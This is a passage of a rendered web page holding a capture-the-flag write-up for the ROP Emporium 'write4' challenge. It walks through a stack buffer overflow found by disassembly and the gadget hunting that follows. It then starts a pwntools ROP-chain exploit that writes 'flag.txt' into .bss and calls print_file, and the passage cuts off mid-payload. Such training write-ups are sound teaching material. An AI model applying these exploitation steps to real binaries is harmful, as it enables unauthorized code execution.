operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008ef\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"69\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008f4\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"74\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008f9\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"79\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00000000000008fc\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"82\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x760\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"memset@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000901\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xf8\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xa00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000908\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"94\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000000090d\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"99\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x115\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xa29\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000914\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"106\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000919\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"111\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x750\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"printf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000000091e\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"116\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000922\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"120\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x200\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000927\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"125\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000000092a\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"128\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000000092f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"133\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x770\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"read@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000934\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"138\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xf1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xa2c\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000000093b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"145\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x730\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000940\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"150\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000941\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"151\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tleave  \n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000000942\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"152\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsx)(n.p,{children:\"From the code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.\"}),(0,e.jsx)(n.div,{children:(0,e.jsx)(l,{alt:\"\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(n.p,{children:[\"Therefore the next interesting function is \",(0,e.jsx)(n.strong,{children:\"read\"}),\" function, which reads for user input and stores in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\"]}),(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsx)(n.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token class-name\",children:\"ssize_t\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"int\"}),\" fd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\"buf\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"size_t\"}),\" count\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"// read(0,[rbp-0x20], 0x200)\"}),`\n`]})})}),(0,e.jsx)(n.p,{children:\"From the vulnerability,we can exploit it in order to abuse the control flow of the program through controlling the value of the return address.\"}),(0,e.jsx)(n.p,{children:\"From the authors hint , we need to look for an ELF section that is writable in order to write our string.\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsxs)(n.p,{children:[`Perhaps the most important thing to consider in this challenge is where we're going to write our \"flag.txt\" string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Opening the binary in radare2, we can check the permissions of different sections using the command `,(0,e.jsx)(n.strong,{children:\"iS\"}),\" as in the image above. ![]/static/images/ropemporium/write4_where.png)\"]})}),(0,e.jsxs)(n.p,{children:[\"From the above we are able to determine the data and bss section is both readable and writable. Our target for the ropchain is to write our string to the \",(0,e.jsx)(n.strong,{children:\"bss\"}),\" section. Therefore we need to get memory address of \",(0,e.jsx)(n.strong,{children:\".bss\"}),\" area.\"]}),(0,e.jsx)(n.p,{children:\"From the authors challenge hint, we need to disassemble usefulFunction to understand how it works.\"}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:'Important! A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like \"flag.txt\") as the 1st argument.'})}),(0,e.jsxs)(n.p,{children:[\"From the disassembly of the binary, we have an interesting function called usefulFunction. The function is responsible for calling \",(0,e.jsx)(n.strong,{children:\"print_file\"}),\" function as hinted by the author.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(l,{alt:\"\",src:\"/static/images/ropemporium/write4_useful.png\",width:\"793\",height:\"182\"})}),(0,e.jsxs)(n.p,{children:[\"From the analysis of the above function, we can determine we are passing a string file name called \",(0,e.jsx)(n.strong,{children:'\"nonexistent\"'}),\" to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest \",(0,e.jsx)(n.strong,{children:\"flag.txt\"}),\" to the the print_file function.\"]}),(0,e.jsxs)(n.p,{children:[\"From the disassembly of the binary we have another interesting function called \",(0,e.jsx)(n.strong,{children:\"usefulGadgets\"}),\".\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) disas usefulGadgets \n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function usefulGadgets:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400628\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tmov    QWORD PTR \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r14\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040062b\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`:\tret    \n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040062c\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\":\tnop    DWORD PTR \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(gdb) \n`})]})}),(0,e.jsxs)(n.p,{children:[\"The gadget from the above disassembled code will enable us to write content in r15 register to memory address [r14]. Next step is to look for gadgets that will enable us to control both the \",(0,e.jsx)(n.strong,{children:\"r14\"}),\" and \",(0,e.jsx)(n.strong,{children:\"r15\"}),\" register values.\"]}),(0,e.jsxs)(n.p,{children:[\"For building our ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly \",(0,e.jsx)(n.strong,{children:\"pop\"}),\" instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both r14 and r15.\"]}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040068f\"}),\"                 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5d\"}),\"  pop \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400690\"}),\"               415e  pop \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r14\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400692\"}),\"               415f  pop \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400694\"}),`                 c3  ret\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"Example of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we dont need the rbp register, for our ropchain, we take the address pointed py pop14 \",(0,e.jsx)(n.strong,{children:\"0x00400690\"}),\" . This is possible because rop gadgets are set of instructions that end with \",(0,e.jsx)(n.strong,{children:\"ret\"}),\".\"]}),(0,e.jsxs)(n.p,{children:[\"From the disassembly of usedfulgadgets function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of \",(0,e.jsx)(n.strong,{children:\".bss\"}),\" section of ELF and r15 register to be the value we want to write to the \",(0,e.jsx)(n.strong,{children:\".bss\"}),\" section.\"]}),(0,e.jsx)(n.blockquote,{children:(0,e.jsx)(n.p,{children:\"Hopefully you've realized that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won't be using built-in functionality since that's too similar to the previous challenges, instead we'll be looking for gadgets that let us write a value to memory such as mov [reg], reg.\"})}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400628\"}),\"             4d893e  mov qword \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r14\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),\", \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"r15\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0040062b\"}),`                 c3  ret\n`]})]})}),(0,e.jsx)(n.p,{children:\"Therefore, the two gadgets that will enable us to set the register values of r14 and r15 and copy the values of r15 to the memory region defined by r14.\"}),(0,e.jsx)(n.p,{children:\"Last is a find a gadget that will aid passing of an argument to the print_file function. Because the function takes one argument as a parameter, we look for a pop rdi ret instruction\"}),(0,e.jsx)(n.pre,{className:\"language-nasm\",children:(0,e.jsxs)(n.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400693\"}),\"                 5f  pop \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rdi\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400694\"}),`                 c3  ret\n`]})]})}),(0,e.jsxs)(n.p,{children:[\"Now we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the \",(0,e.jsx)(n.strong,{children:\"flag.txt\"}),\" and display output to the console.\"]}),(0,e.jsxs)(n.h2,{id:\"exploit\",children:[(0,e.jsx)(n.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(n.p,{children:\"A fully working ropchain exploit of the challenge is,\"}),(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"arch \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"amd64\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encoding \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"latin-1\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"warnings\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"simplefilter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"ignore\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"process\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./write4'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"bss_area \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00601038\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pop_r14_r15 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400690\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pop_rdi \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400693\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_r14_r15 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x00400628\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"print_file_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400510\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"A\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),\" \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#fill the buffer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"B\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token 